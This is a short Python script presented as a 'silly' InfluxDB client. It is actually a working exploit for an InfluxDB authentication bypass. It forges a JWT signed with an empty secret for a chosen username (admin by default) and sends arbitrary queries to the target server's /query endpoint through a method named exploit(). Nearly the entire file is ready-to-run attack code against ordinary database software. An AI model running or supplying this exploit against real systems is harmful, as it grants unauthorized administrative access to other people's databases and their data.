#!/usr/bin/env python3
import time
import urllib
import argparse
import requests as requests
import jwt
from pprint import pprint


class Query:
    def __init__(self) -> None:
        pass

    def parse_args(self):
        parser = argparse.ArgumentParser(
            description="A simple, silly, over-the-top influxdb client made in Python"
        )
        parser.add_argument(
            "--host",
            default="127.0.0.1",
            help="The target IP. (default: localhost)",
        )
        parser.add_argument(
            "--port", "-p", default="8086", help="The target port. (default: 8086) "
        )
        parser.add_argument(
            "--user", default="admin", help="The target username. (default: admin)"
        )
        parser.add_argument("--db", default="dummy", help="The database to use.")
        parser.add_argument(
            "query",
            default="SHOW DATABASES",
            help="The query to execute. default: SHOW DATABASES",
        )
        args = parser.parse_args()
        self.args = args

    def generate_token(self):
        exp = int(time.time())
        exp = exp + 2628000  # 1 month

        payload = {"username": self.args.user, "exp": exp}

        return jwt.encode(payload, "", algorithm="HS256")

    def generate_request(self):
        token = self.generate_token()
        try:
            headers = {
                "Authorization": f"Bearer {token}",
            }
        except:
            token = token.decode("utf-8")
            headers = {
                "Authorization": f"Bearer {token}",
            }

        # Send request
        query = urllib.parse.quote_plus(self.args.query)
        response = requests.get(
            f"http://{self.args.host}:{self.args.port}/query?db={self.args.db}&q={query}",
            headers=headers,
        )
        return response.json()

    def exploit(self):
        result = self.generate_request()
        pprint(result)


if __name__ == "__main__":
    query = Query()
    query.parse_args()
    query.exploit()
